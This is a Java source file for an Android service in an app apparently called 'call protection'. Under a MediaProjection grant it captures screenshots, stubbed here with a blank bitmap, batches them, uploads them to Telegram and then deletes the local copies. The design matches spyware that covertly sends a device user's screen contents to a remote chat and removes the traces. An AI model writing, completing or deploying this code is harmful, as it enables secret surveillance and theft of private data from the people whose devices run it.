package com.daria.callprotection;

import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class ScreenshotService extends Service {

    private static final String TAG = "ScreenshotService";
    private MediaProjection mediaProjection;
    private ExecutorService executorService;
    private Handler mainHandler;

    private final List<File> batchScreenshots = new ArrayList<>();
    private static final int BATCH_LIMIT = 5;

    @Override
    public void onCreate() {
        super.onCreate();
        executorService = Executors.newSingleThreadExecutor();
        mainHandler = new Handler(getMainLooper());
        Log.d(TAG, "ScreenshotService created");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        int resultCode = intent.getIntExtra("resultCode", 0);
        Intent data = intent.getParcelableExtra("data");

        MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        if (mpm != null && data != null) {
            mediaProjection = mpm.getMediaProjection(resultCode, data);
            startCapturing();
        } else {
            Log.e(TAG, "MediaProjectionManager or data is null");
            stopSelf();
        }
        return START_NOT_STICKY;
    }

    private void startCapturing() {
        executorService.execute(() -> {
            try {
                // Здесь логика получения скриншотов через VirtualDisplay и ImageReader
                // Заглушка для примера — создаём тестовый Bitmap
                Bitmap dummyBitmap = Bitmap.createBitmap(1080, 1920, Bitmap.Config.ARGB_8888);
                saveScreenshot(dummyBitmap);
            } catch (Exception e) {
                Log.e(TAG, "Error capturing screenshot", e);
            }
        });
    }

    private void saveScreenshot(Bitmap bitmap) {
        try {
            File dir = new File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "screenshots");
            if (!dir.exists() && !dir.mkdirs()) {
                Log.e(TAG, "Failed to create screenshots directory");
                return;
            }

            File file = new File(dir, "screenshot_" + System.currentTimeMillis() + ".png");
            try (FileOutputStream out = new FileOutputStream(file)) {
                bitmap.compress(Bitmap.CompressFormat.PNG, 100, out);
                batchScreenshots.add(file);
                Log.d(TAG, "Screenshot saved: " + file.getAbsolutePath());
            }

            if (batchScreenshots.size() >= BATCH_LIMIT) {
                sendBatchToTelegram();
            }

        } catch (IOException e) {
            Log.e(TAG, "Error saving screenshot", e);
        }
    }

    private void sendBatchToTelegram() {
        List<File> batchToSend = new ArrayList<>(batchScreenshots);
        batchScreenshots.clear();

        executorService.execute(() -> {
            try {
                TelegramUploader uploader = new TelegramUploader(getApplicationContext());
                for (File screenshot : batchToSend) {
                    if (!screenshot.exists()) continue;
                    boolean success = uploader.sendFile(screenshot, "Screenshot");
                    if (success) {
                        boolean deleted = screenshot.delete();
                        if (!deleted) {
                            Log.w(TAG, "Failed to delete screenshot after sending");
                        }
                    } else {
                        Log.e(TAG, "Failed to send screenshot: " + screenshot.getName());
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Error sending batch screenshots", e);
            }
        });
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (mediaProjection != null) {
            mediaProjection.stop();
        }
        executorService.shutdown();
        Log.d(TAG, "ScreenshotService destroyed");
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
                        
